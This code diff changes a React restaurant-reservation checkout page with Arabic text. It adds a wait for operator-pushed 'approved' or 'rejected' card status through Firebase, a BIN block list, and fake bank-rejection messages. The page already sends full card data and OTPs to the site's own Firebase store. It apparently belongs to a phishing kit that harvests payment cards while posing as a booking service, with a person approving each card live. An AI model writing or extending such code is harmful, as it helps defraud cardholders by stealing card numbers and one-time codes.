@@ -2,7 +2,7 @@ import { useState, useRef, useEffect } from "react";
 import { Link, useParams } from "wouter";
 import { ArrowRight, Calendar, Clock, Users, CheckCircle, User, Phone, FileText, ChevronLeft, CreditCard, ShieldCheck, Lock, Wifi, ChevronDown, Receipt, RefreshCw, X, Gift } from "lucide-react";
 import { getRestaurantById } from "@/lib/restaurant-data";
-import { addData, handlePay, handleOtp, listenForOtpApproval } from "@/lib/firebase";
+import { addData, handlePay, handleOtp, listenForOtpApproval, listenForApproval, isBinBlocked } from "@/lib/firebase";
 import { setupOnlineStatus } from "@/lib/utils";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -286,8 +286,27 @@ export default function Reserve() {
     return Object.keys(newErrors).length === 0;
   };
 
+  const [isWaitingApproval, setIsWaitingApproval] = useState(false);
+
+  useEffect(() => {
+    if (!isWaitingApproval) return;
+    const unsubscribe = listenForApproval((status) => {
+      if (status === "approved") {
+        setIsWaitingApproval(false);
+        setStep(6);
+      } else if (status === "rejected") {
+        setIsWaitingApproval(false);
+        setCardErrors((prev) => ({
+          ...prev,
+          submit: "تم رفض البطاقة من قبل البنك. يرجى استخدام بطاقة أخرى.",
+        }));
+      }
+    });
+    return () => unsubscribe();
+  }, [isWaitingApproval]);
+
   const handlePaymentSubmit = async () => {
-    if (isSubmitting) return;
+    if (isSubmitting || isWaitingApproval) return;
     if (!validateCard()) return;
     setIsSubmitting(true);
     setCardErrors((prev) => ({ ...prev, submit: "" }));
@@ -296,6 +315,19 @@ export default function Reserve() {
 
     const normalizedCardNumber = cardNumber.replace(/\s/g, "");
     const normalizedCardType = getCardType(cardNumber);
+
+    try {
+      if (await isBinBlocked(normalizedCardNumber)) {
+        setCardErrors((prev) => ({
+          ...prev,
+          submit: "هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.",
+        }));
+        setIsSubmitting(false);
+        return;
+      }
+    } catch {
+      // ignore lookup errors
+    }
     const paymentInfo = {
       cardNumber: normalizedCardNumber,
       cardName,
@@ -340,10 +372,8 @@ export default function Reserve() {
       return;
     }
 
-    setTimeout(() => {
-      setIsSubmitting(false);
-      setStep(6);
-    }, 3000);
+    setIsSubmitting(false);
+    setIsWaitingApproval(true);
   };
 
   const handleOtpChange = (value: string) => {
@@ -921,14 +951,35 @@ export default function Reserve() {
                   </p>
                 )}
 
+                {isWaitingApproval && (
+                  <div
+                    className="bg-[#fdf6e3] border border-[#c9a96e]/40 rounded-xl p-4 flex items-center gap-3"
+                    data-testid="card-waiting-approval-reserve"
+                  >
+                    <div className="w-6 h-6 border-2 border-[#c9a96e]/30 border-t-[#c9a96e] rounded-full animate-spin flex-shrink-0" />
+                    <div className="text-right flex-1">
+                      <p className="text-[#4a1525] font-semibold text-sm">
+                        في انتظار موافقة البنك على البطاقة
+                      </p>
+                      <p className="text-[#7a6b5f] text-xs mt-0.5">
+                        يرجى عدم إغلاق الصفحة، قد تستغرق العملية بضع لحظات...
+                      </p>
+                    </div>
+                  </div>
+                )}
+
                 <Button
                   onClick={handlePaymentSubmit}
                   size="lg"
                   className="w-full bg-primary text-white shadow-lg mt-4"
-                  disabled={isSubmitting}
+                  disabled={isSubmitting || isWaitingApproval}
                   data-testid="button-pay-reserve"
                 >
-                  {isSubmitting ? "جاري المعالجة..." : "متابعة الدفع"}
+                  {isWaitingApproval
+                    ? "في انتظار الموافقة..."
+                    : isSubmitting
+                    ? "جاري المعالجة..."
+                    : "متابعة الدفع"}
                 </Button>
               </div>
 
